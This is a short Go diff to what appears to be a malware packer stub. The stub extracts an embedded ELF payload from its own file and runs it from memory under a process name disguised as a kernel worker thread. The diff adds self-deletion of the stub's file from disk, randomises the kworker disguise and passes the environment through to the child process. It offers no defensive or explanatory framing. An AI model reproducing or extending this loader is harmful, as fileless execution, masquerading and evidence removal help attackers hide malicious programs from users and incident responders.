@@ -75,6 +75,7 @@ func runFromMemory(procName string, buffer []byte) {
 		log.Fatal(err)
 	}
 	cmd := exec.Command(procName, os.Args[1:]...)
+	cmd.Env = os.Environ()
 	err = cmd.Start()
 	if err != nil {
 		log.Fatal(err)
@@ -86,6 +87,7 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+	os.RemoveAll(os.Args[0]) // self destruction
 	// locate the ELF file
 	elfbegining := bytes.LastIndex(wholeStub, []byte(utils.Sep))
 	elfBytes := wholeStub[(elfbegining + len(utils.Sep)):]
@@ -108,6 +110,6 @@ func main() {
 	}
 
 	// write ELF to memory and run it
-	procName := fmt.Sprintf("[kworker/3:%s]", utils.RandStr(7))
+	procName := fmt.Sprintf("[kworker/%d:%s]", utils.RandInt(), utils.RandStr(7))
 	runFromMemory(procName, w.Bytes())
 }
